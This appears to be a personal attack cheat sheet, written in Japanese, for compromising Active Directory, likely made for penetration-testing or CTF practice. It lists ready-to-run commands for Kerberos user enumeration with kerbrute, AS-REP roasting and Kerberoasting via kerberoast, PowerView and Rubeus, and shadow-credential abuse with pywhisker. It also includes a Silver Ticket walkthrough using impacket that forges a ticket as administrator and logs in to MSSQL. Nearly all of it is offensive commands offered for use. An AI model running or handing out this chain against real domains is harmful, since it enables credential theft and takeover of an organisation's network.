//kerbrute
./kerbrute_linux_amd64 userenum -d <domain> --dc <IP> user.txt #kerbruteはgitからダウンロード　
-usernum #ユーザの列挙
-d # ドメイン名の指定（○○○○.localみたいな）
--dc #ドメコンの指定（IPアドレスでよい）
#kerbruteで見つけたユーザ名からリストの作成
grep -oP 'VALID USERNAME:\s+\K.*(?=@)' user.txt > outoput.txt

//targetedKerberoast
//例
kerberoast ldap all <ldap_connection_url> -o ldapenum #LDAP経由で脆弱なユーザーを探す
kerberoast asreproast <DC_ip> -t ldapenum_asrep_users.txt #ldapenum_asrep_users.txtファイル内のユーザーに対してASREPローストを使用する
kerberoast spnroast <kerberos_connection_url> -t ldapenum_spn_users.txt #ldapenum_spn_users.txtファイル内のユーザーに対してSPNローストを使用する
hashcatなどで SPNローストとASPREPローストの出力をクラックする
kerberoast brute <realm> <dc_ip> <targets> <options> #総当たりでユーザの列挙
./targetedKerberoast.py -v -d <domain> -u <user> -p <pass> #権限のあるユーザでTGTの作成
＊＊エラーがでたとき＊＊
kerberoastを実行したときKRB_AP_ERR_SKEW(Clock skew too great)というエラーが出たときは、相手サーバとこちらの時刻同期がズレすぎているということなので以下を実施する
systemctl stop systemd-timesyncd #いったん自分の時刻規制をとめて
sudo ntpdate -u <IP> #ntpdateで相手と同期

//pywhisker
pyWhisker は、ターゲットの msDs-KeyCredentialLink 属性に対してさまざまなアクションを実行するために使用できる
list:現在のすべての KeyCredentials ID と作成時刻を一覧表示
add:新しいKeyCredentialをmsDs-KeyCredentialLinkに追加
spray:新しいKeyCredentialをスプレーしてmsDs-KeyCredentialLinkに追加する
remove:KeyCredentialをmsDs-KeyCredentialLinkから消す
clear:すべてのKeyCredentialsを削除します
info:KeyCredential 構造に含まれるすべての情報を出力します
export:msDs-KeyCredentialLinkJSON内のすべてのKeyCredentialsをエクスポートします
import:msDs-KeyCredentialLinkJSONファイルからのKeyCredentialsで上書きする
//使用例
python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target user> --action "add"
＊＊エラーがでたとき＊＊
ModuleNotFoundErrorがでたときは下記を実行
wget http://launchpadlibrarian.net/732112002/python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb
sudo dpkg -i python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb
wget http://launchpadlibrarian.net/715850281/python3-openssl_24.0.0-1_all.deb
sudo dpkg -i python3-openssl_24.0.0-1_all.deb

//powerView（power shellのモジュール)
Import-Module .\PowerView.ps1 #ターゲットのPS上でpowerviewをインポート
Get-DomainUser -UACFilter DONT_REQ_PREAUTH #ASReproastingの対象となるユーザの探索
Set-DomainObject -Identity <user> -XOR @{useraccountcontrol=4194304} -Verbose #GenericAll権限があるユーザでほかのユーザにASReproastingが効くようにする
Get-DomainUser -SPN #SPNの列挙
Get-DomainSID #domain sidの入手
Invoke-Kerberoast　#kerberoastingの実行

//Rubeus.exe (asreproast /format:hashcatを使用して、DONT_REQ_PREAUTHフラグを持つすべてのアカウントを列挙することもできる)
.\Rubeus.exe asreproast /user:<user名> /domain:<domain> /dc:<dc name> /nowrap /outfile:hash.txt #asreproasting
.\Rubeus.exe kerberoast /nowrap #kerberoasting

***メモ***
【シルバーチケット攻撃】
Silver Ticket は偽造された TGS (Ticket Granting Service) チケットで、DC を経由せずにクライアントとサービス間で直接使用されます。
代わりに、TGS チケットはサービス アカウント自体によって署名されるため、Silver Ticket はサービス自体の認証のみに制限されます。
シルバー チケットを作成するには、攻撃者は次のものが必要です。
１：サービス アカウントのパスワードの NTLM ハッシュ。
２：ドメインのSID
３：アカウントに関連付けられたサービス プリンシパル名 (SPN)。
＃例
//SPNとパスワードハッシュを入手（ハッシュは解析したあとにNTLMハッシュに変換）
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-host <dc name> -request -k
//SIDを入手
impacket-getPac -targetUser administrator <domain>/<user>:<pass>
//SPN、NTLMハッシュ、SIDでシルバーチケットを作成
impacket-ticketer -nthash <NTLM hash> -domain-sid <SID> -domain <domain> -dc-ip <IP> -spn <SPN> administrator
//チケットを使ってケルベロスに接続
KRB5CCNAME=administrator.ccache impacket-mssqlclient -k <dc name>
